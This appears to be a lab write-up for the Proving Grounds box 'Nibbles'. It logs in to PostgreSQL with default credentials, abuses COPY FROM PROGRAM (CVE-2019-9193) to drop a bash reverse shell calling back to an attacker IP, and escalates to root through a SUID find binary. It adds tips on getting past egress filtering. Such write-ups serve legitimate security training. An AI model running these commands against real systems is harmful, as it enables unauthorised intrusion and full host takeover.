# Nibbles — Proving Grounds

> [!abstract] Summary
> Nibbles exposes a PostgreSQL 11 service on the non-standard port 5437 that accepts the default credentials `postgres:postgres`. As a database superuser, the `COPY ... FROM PROGRAM` feature (CVE-2019-9193) runs OS commands, which is used to drop and execute a bash reverse shell as the `postgres` service user. Privilege escalation is a SUID-set `find` binary, abused with the standard `find -exec` technique to spawn a root shell.

**Target:** `192.168.143.47`

## Methodology

1. Scan all TCP ports and identify exposed services.
2. Log in to PostgreSQL with default credentials and abuse `COPY ... FROM PROGRAM` for command execution.
3. Catch a reverse shell as the service user.
4. Enumerate SUID binaries and escalate to root via the SUID `find`.

## Exploitation

### PostgreSQL default credentials

#### ==🔵PostgreSQL (Port 543X)==

Try default credentials to log in: `postgres:postgres`. Change the port and IP as needed:
```
psql -h 192.168.178.47 -p 5437 -U postgres
```
When prompted for the password, enter `postgres`.

### `COPY ... FROM PROGRAM` command execution (CVE-2019-9193)

> [!info] Why this works
> In PostgreSQL 9.3 through 11.7, the `COPY TO/FROM PROGRAM` function lets a superuser (or any member of the `pg_execute_server_program` role) run arbitrary OS commands as the user running the database. Logging in as the `postgres` superuser therefore gives direct command execution on the host. This is tracked as CVE-2019-9193 (PostgreSQL maintainers consider it documented behaviour rather than a bug, but the effect is the same).

First, create a table to hold command output:
```
DROP TABLE IF EXISTS cmd_exec;  

CREATE TABLE cmd_exec(cmd_output text);
```

Next, create a payload file in `/tmp`, then run it with bash to connect back to a netcat listener.

On Kali, start the listener:
```
nc -nvlp 5437
```

Then write and execute the reverse-shell script through `COPY ... FROM PROGRAM`:
```
COPY cmd_exec FROM PROGRAM 'echo "sh -i >& /dev/tcp/192.168.45.185/5437 0>&1" > /tmp/poo.sh';  

COPY cmd_exec FROM PROGRAM '/bin/bash /tmp/poo.sh';
```
We get a reverse shell (as the `postgres` service user).

> [!tip] Learning note — listener port selection
> The reverse shell here uses port **5437** for the callback, matching the PostgreSQL port that is already known-open. If a random high port fails to connect, egress filtering is likely dropping it — reuse a port the target already exposes (as done here) to get the connection out.

> [!note]
> The addresses in this section are mixed as captured: the scan target is `192.168.143.47`, the `psql` example uses `192.168.178.47`, and the reverse-shell payload calls back to the Kali host `192.168.45.185`. Use the current target and attacker IPs consistently when reproducing.

## Privilege escalation: SUID `find`

The `COPY` reverse shell lands as the low-privileged `postgres` user — reading `/root/proof.txt` directly through a `COPY` table fails with a permission error, so a proper escalation is needed.

Enumerate SUID binaries:
```
find / -perm -4000 -type f 2>/dev/null
```

`find` itself is SUID root. A SUID binary runs with its owner's privileges, so a SUID `find` owned by root can spawn a root shell using its `-exec` action (the standard GTFOBins technique):
```
find . -exec /bin/sh -p \; -quit
```

The `-p` keeps the elevated (effective) UID. Confirm with `id`:
```
id
```
The effective UID is now `root` (the process may still show the real UID as `postgres`), which is enough to read `/root/proof.txt`.

## Lessons learned

- Non-standard ports hide standard services — PostgreSQL on 5437 is the whole box. Always run a full `-p-` scan and service-detect every open port.
- Default service credentials (`postgres:postgres`) are worth trying first; superuser DB access on PostgreSQL ≤ 11.7 is effectively host command execution via `COPY ... FROM PROGRAM`.
- Matching the reverse-shell callback port to an already-open service port is a reliable way around egress filtering.
- After any shell, enumerate SUID binaries (`find / -perm -4000 -type f 2>/dev/null`) early — a SUID `find` (or any GTFOBins-listed binary) is an immediate root.
